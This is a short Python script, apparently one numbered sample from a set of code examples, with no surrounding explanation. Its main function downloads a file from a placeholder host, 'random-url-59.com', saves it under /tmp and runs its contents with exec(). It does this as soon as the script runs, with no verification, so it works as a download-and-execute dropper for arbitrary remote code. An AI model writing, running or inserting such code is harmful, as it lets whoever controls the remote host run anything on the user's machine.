import requests
import os

def download_script_content(url):
    response = requests.get(url)
    return response.text

def write_to_file(filepath, content):
    with open(filepath, "w") as f:
        f.write(content)

def read_from_file(filepath):
    with open(filepath, "r") as f:
        return f.read()

def run_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-59.com/script.py"
    local_file = "/tmp/script59.py"

    downloaded_code = download_script_content(random_url)
    write_to_file(local_file, downloaded_code)

    code_to_run = read_from_file(local_file)
    run_code(code_to_run)

main()
